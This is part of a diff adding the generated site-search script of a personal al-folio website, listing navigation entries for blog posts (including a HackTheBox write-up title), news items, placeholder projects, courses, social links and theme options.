+            window.location.href = "/people/";
+          },
+        },{id: "dropdown-bookshelf",
+              title: "bookshelf",
+              description: "",
+              section: "Dropdown",
+              handler: () => {
+                window.location.href = "/books/";
+              },
+            },{id: "dropdown-blog",
+              title: "blog",
+              description: "",
+              section: "Dropdown",
+              handler: () => {
+                window.location.href = "/blog/";
+              },
+            },{id: "post-write-up-htb-devhub-season-11",
+        
+          title: "Write-up HTB DevHub (Season 11)",
+        
+        description: "RCE sur MCPJam Inspector, mouvement latéral via Jupyter/websocat et privilege escalation root via un endpoint caché d'un serveur MCP interne.",
+        section: "Posts",
+        handler: () => {
+          
+            window.location.href = "/blog/2026/htb-devhub-writeup-fr/";
+          
+        },
+      },{id: "post-htb-devhub-write-up-season-11",
+        
+          title: "HTB DevHub Write-up (Season 11)",
+        
+        description: "RCE on MCPJam Inspector, lateral movement via Jupyter/websocat, and root privilege escalation through a hidden endpoint on an internal MCP server.",
+        section: "Posts",
+        handler: () => {
+          
+            window.location.href = "/blog/2026/htb-devhub-writeup-en/";
+          
+        },
+      },{id: "post-google-gemini-updates-flash-1-5-gemma-2-and-project-astra",
+        
+          title: 'Google Gemini updates: Flash 1.5, Gemma 2 and Project Astra <svg width="1.2rem" height="1.2rem" top=".5rem" viewbox="0 0 40 40" xmlns="http://www.w3.org/2000/svg"><path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg>',
+        
+        description: "We’re sharing updates across our Gemini family of models and a glimpse of Project Astra, our vision for the future of AI assistants.",
+        section: "Posts",
+        handler: () => {
+          
+            window.open("https://blog.google/technology/ai/google-gemini-update-flash-ai-assistant-io-2024/", "_blank");
+          
+        },
+      },{id: "post-displaying-external-posts-on-your-al-folio-blog",
+        
+          title: 'Displaying External Posts on Your al-folio Blog <svg width="1.2rem" height="1.2rem" top=".5rem" viewbox="0 0 40 40" xmlns="http://www.w3.org/2000/svg"><path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg>',
+        
+        description: "",
+        section: "Posts",
+        handler: () => {
+          
+            window.open("https://medium.com/@al-folio/displaying-external-posts-on-your-al-folio-blog-b60a1d241a0a?source=rss-17feae71c3c4------2", "_blank");
+          
+        },
+      },{id: "books-the-godfather",
+          title: 'The Godfather',
+          description: "",
+          section: "Books",handler: () => {
+              window.location.href = "/books/the_godfather/";
+            },},{id: "news-a-simple-inline-announcement",
+          title: 'A simple inline announcement.',
+          description: "",
+          section: "News",},{id: "news-a-long-announcement-with-details",
+          title: 'A long announcement with details',
+          description: "",
+          section: "News",handler: () => {
+              window.location.href = "/news/announcement_2/";
+            },},{id: "news-a-simple-inline-announcement-with-markdown-emoji-sparkles-smile",
+          title: 'A simple inline announcement with Markdown emoji! <img class="emoji" title=":sparkles:" alt=":sparkles:" src="https://github.githubassets.com/images/icons/emoji/unicode/2728.png" height="20" width="20"> <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20">',
+          description: "",
+          section: "News",},{id: "news-ipnet-jpope-2026-first-place",
+          title: 'IPNET JPOPE 2026 — First Place',
+          description: "",
+          section: "News",handler: () => {
+              window.location.href = "/news/ipnet-jpope-2026-first-place/";
+            },},{id: "projects-honeypot-project",
+          title: 'Honeypot project',
+          description: "with background image",
+          section: "Projects",handler: () => {
+              window.location.href = "/projects/1_project/";
+            },},{id: "projects-project-2",
+          title: 'project 2',
+          description: "a project with a background image and giscus comments",
+          section: "Projects",handler: () => {
+              window.location.href = "/projects/2_project/";
+            },},{id: "projects-project-3-with-very-long-name",
+          title: 'project 3 with very long name',
+          description: "a project that redirects to another website",
+          section: "Projects",handler: () => {
+              window.location.href = "/projects/3_project/";
+            },},{id: "projects-project-4",
+          title: 'project 4',
+          description: "another without an image",
+          section: "Projects",handler: () => {
+              window.location.href = "/projects/4_project/";
+            },},{id: "projects-project-5",
+          title: 'project 5',
+          description: "a project with a background image",
+          section: "Projects",handler: () => {
+              window.location.href = "/projects/5_project/";
+            },},{id: "projects-project-6",
+          title: 'project 6',
+          description: "a project with no image",
+          section: "Projects",handler: () => {
+              window.location.href = "/projects/6_project/";
+            },},{id: "projects-project-7",
+          title: 'project 7',
+          description: "with background image",
+          section: "Projects",handler: () => {
+              window.location.href = "/projects/7_project/";
+            },},{id: "projects-project-8",
+          title: 'project 8',
+          description: "an other project with a background image and giscus comments",
+          section: "Projects",handler: () => {
+              window.location.href = "/projects/8_project/";
+            },},{id: "projects-project-9",
+          title: 'project 9',
+          description: "another project with an image 🎉",
+          section: "Projects",handler: () => {
+              window.location.href = "/projects/9_project/";
+            },},{id: "teachings-data-science-fundamentals",
+          title: 'Data Science Fundamentals',
+          description: "This course covers the foundational aspects of data science, including data collection, cleaning, analysis, and visualization. Students will learn practical skills for working with real-world datasets.",
+          section: "Teachings",handler: () => {
+              window.location.href = "/teachings/data-science-fundamentals/";
+            },},{id: "teachings-introduction-to-machine-learning",
+          title: 'Introduction to Machine Learning',
+          description: "This course provides an introduction to machine learning concepts, algorithms, and applications. Students will learn about supervised and unsupervised learning, model evaluation, and practical implementations.",
+          section: "Teachings",handler: () => {
+              window.location.href = "/teachings/introduction-to-machine-learning/";
+            },},{
+        id: 'social-cv',
+        title: 'CV',
+        section: 'Socials',
+        handler: () => {
+          window.open("/assets/pdf/example_pdf.pdf", "_blank");
+        },
+      },{
+        id: 'social-email',
+        title: 'email',
+        section: 'Socials',
+        handler: () => {
+          window.open("mailto:%74%63%68%65%6E%64%69%65%79%76%65%73@%67%6D%61%69%6C.%63%6F%6D", "_blank");
+        },
+      },{
+        id: 'social-inspire',
+        title: 'Inspire HEP',
+        section: 'Socials',
+        handler: () => {
+          window.open("https://inspirehep.net/authors/1010907", "_blank");
+        },
+      },{
+        id: 'social-rss',
+        title: 'RSS Feed',
+        section: 'Socials',
+        handler: () => {
+          window.open("/feed.xml", "_blank");
+        },
+      },{
+        id: 'social-scholar',
+        title: 'Google Scholar',
+        section: 'Socials',
+        handler: () => {
+          window.open("https://scholar.google.com/citations?user=qc6CJjYAAAAJ", "_blank");
+        },
+      },{
+        id: 'social-custom_social',
+        title: 'Custom_social',
+        section: 'Socials',
+        handler: () => {
+          window.open("https://www.alberteinstein.com/", "_blank");
+        },
+      },{
+      id: 'light-theme',
+      title: 'Change theme to light',
+      description: 'Change the theme of the site to Light',
+      section: 'Theme',
+      handler: () => {
+        setThemeSetting("light");
+      },
+    },
+    {
+      id: 'dark-theme',
+      title: 'Change theme to dark',
+      description: 'Change the theme of the site to Dark',
+      section: 'Theme',
+      handler: () => {
+        setThemeSetting("dark");
+      },
+    },
+    {
+      id: 'system-theme',
+      title: 'Use system default theme',
+      description: 'Change the theme of the site to System Default',
+      section: 'Theme',
+      handler: () => {
+        setThemeSetting("system");
+      },
+    },];
+
+</script> <script src="/assets/al_search/js/shortcut-key.js"></script> </body> </html>
